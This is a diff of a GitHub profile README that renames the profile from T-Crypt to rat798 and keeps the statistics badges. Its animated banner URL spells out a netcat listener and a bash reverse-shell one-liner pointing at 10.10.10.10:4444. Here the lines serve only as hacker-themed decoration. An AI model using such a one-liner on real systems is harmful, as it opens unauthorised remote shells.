@@ -1,8 +1,8 @@
-<h1 align="center">Hi 👋, I'm T-Crypt</h1>
+<h1 align="center">Hi 👋, I'm rat798</h1>
 
 <p align="left"> <img src="https://komarev.com/ghpvc/?username=t-crypt&label=Profile%20views&color=0e75b6&style=flat" alt="t-crypt" /> </p>
 
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=29E8F7&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BT-Crpyt%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;T-Crypt%40profile%3A~%24+.%2Fexploit.py;......................................................................................................;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;T-Crypt" alt="Typing SVG" /></a>
+<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=29E8F7&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5rat798%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;rat798%40profile%3A~%24+.%2Fexploit.py;......................................................................................................;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;T-Crypt" alt="Typing SVG" /></a>
 
 &nbsp;
 <!--💬GREETINGSTITLE / FONTS: https://www.thefancytext.com/ and then paste on 🌐WEBSITE: https://github.com/denvercoder1/readme-typing-svg -->
@@ -119,9 +119,9 @@
 
  
  <div align="center">
-<a href="http://www.github.com/T-Crypt"><img width="60%" src="https://github-readme-stats-qljk.vercel.app/api?username=T-Crypt&show_icons=true&include_all_commits=true&count_private=true&title_color=0891b2&text_color=ffffff&icon_color=0891b2&bg_color=0D1117&theme=react&hide_border=true&show_icons=true" alt="T-Crpyts GitHub stats" /></a>
- <a href="https://github.com/anuraghazra/github-readme-stats"><img alt="T-Crypt's Top Languages" src="https://github-readme-stats-qljk.vercel.app/api/top-langs/?username=T-Crypt&langs_count=8&layout=compact&theme=react&hide_border=true&bg_color=1F222E&title_color=F85D7F&icon_color=F8D866" height="192px"/></a>
-<a href="http://www.github.com/T-Crypt"/><img alt="Github Streak" src="https://streak-stats.demolab.com/?user=T-Crypt&show_icons=true&count_private=true&theme=react&hide_border=true&title_color=0891b2&text_color=ffffff&icon_color=0891b2&bg_color=0D1117" width = "100%"/></a>
+<a href="http://www.github.com/rat798"><img width="60%" src="https://github-readme-stats-qljk.vercel.app/api?username=rat798&show_icons=true&include_all_commits=true&count_private=true&title_color=0891b2&text_color=ffffff&icon_color=0891b2&bg_color=0D1117&theme=react&hide_border=true&show_icons=true" alt="T-Crpyts GitHub stats" /></a>
+ <a href="https://github.com/anuraghazra/github-readme-stats"><img alt="rat798's Top Languages" src="https://github-readme-stats-qljk.vercel.app/api/top-langs/?username=rat798&langs_count=8&layout=compact&theme=react&hide_border=true&bg_color=1F222E&title_color=F85D7F&icon_color=F8D866" height="192px"/></a>
+<a href="http://www.github.com/rat798"/><img alt="Github Streak" src="https://streak-stats.demolab.com/?user=rat798&show_icons=true&count_private=true&theme=react&hide_border=true&title_color=0891b2&text_color=ffffff&icon_color=0891b2&bg_color=0D1117" width = "100%"/></a>
 </div>
 
 <!-- ###### END OF My Github Stats  ##### -->
